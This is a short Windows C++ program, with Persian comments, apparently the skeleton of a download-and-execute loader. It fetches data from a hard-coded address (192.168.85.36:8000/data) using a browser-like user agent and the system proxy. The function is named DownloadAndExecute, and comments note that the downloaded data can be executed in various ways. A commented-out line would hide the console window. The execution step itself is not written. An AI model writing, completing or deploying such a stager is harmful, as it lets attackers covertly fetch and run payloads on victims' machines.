#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>

#pragma comment(lib, "wininet.lib")

void DownloadAndExecute() {
    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0",                 // User-Agent بهتر
        INTERNET_OPEN_TYPE_PRECONFIG,  // استفاده از پروکسی سیستم
        NULL, NULL, 0);

    if (!hInternet) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
        return;
    }

    HINTERNET hFile = InternetOpenUrlA(
        hInternet,
        "http://192.168.85.36:8000/data",
        NULL, 0,
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
        0);

    if (!hFile) {
        std::cerr << "InternetOpenUrl failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    char buffer[4096];
    DWORD bytesRead = 0;
    std::string rawData;

    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        rawData.append(buffer, bytesRead);
    }

    std::cout << "Downloaded " << rawData.size() << " bytes." << std::endl;

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);

    // اگر می‌خواهید داده دانلود شده اجرا شود:
    // (روش‌های مختلفی وجود دارد - در ادامه توضیح داده شده)
}

int main() {
    // برای دیباگ، اول کنسول را مخفی نکنید
    // ShowWindow(GetConsoleWindow(), SW_HIDE);

    DownloadAndExecute();

    std::cout << "Press Enter to exit..." << std::endl;
    std::cin.get();
    return 0;
}
